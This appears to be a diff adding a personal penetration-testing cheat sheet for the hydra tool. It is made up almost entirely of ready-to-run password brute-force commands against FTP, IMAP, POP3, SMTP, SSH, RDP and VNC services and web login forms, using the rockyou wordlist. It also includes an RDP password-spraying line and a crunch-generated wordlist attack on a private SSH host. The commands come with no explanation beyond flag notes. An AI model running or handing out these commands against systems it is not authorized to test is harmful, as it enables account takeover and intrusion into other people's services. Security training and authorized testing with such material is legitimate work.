@@ -1,0 +1,36 @@
+### hydra ###
+
+
+## protocols ##
+# -f:exit when a login/pass is found
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt ftp://$h:21 -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt imap://$h:143 -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt pop3://$h -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt pop3s://$h -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt ssh://$h:22 -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt rdp://$h:3389 -t 64 -I -v
+hydra -f -P ~/perso/secu/dict/rockyou.txt vnc://$h:5900 -t 64 -I -v			# no login
+hydra -f -l email@domain.com -P ~/perso/secu/dict/rockyou.txt smtp://$h:25 -t 64 -I -v
+
+
+## spraying ##
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://$h -t 64 -I -v
+
+
+## forms ##
+# :failed text. (default) (in text)
+# :F=failed text. (same) (in text)
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt $h -s 80 http-post-form "/url/to/login:username=^USER^&password=^PASS^:F=incorrect" -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt $h -s 80 http-post-form "/url/login:user=^USER^&pass=^PASS^:failed" -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt $h -s 80 http-get-form "/url/login:user=^USER^&pass=^PASS^:failed" -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt $h -s 80 http-get-form "/url/login:user=^USER^&pass=^PASS^:S=Logout" -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt $h -s 80 http-head /webdav/ -t 64 -I -v
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt $h -s 80 http-get / -t 64 -I -v	# basic auth
+
+
+## utils ##
+hydra -L /path/to/login -P /path/to/pass
+hydra -f -l login -P ~/perso/secu/dict/rockyou.txt ftp://$h:21 -t 64 -I -v -d		# debug mode
+
+crunch 6 6 -t Lab%%% > wordlist								# wordlist
+hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V					# try bf
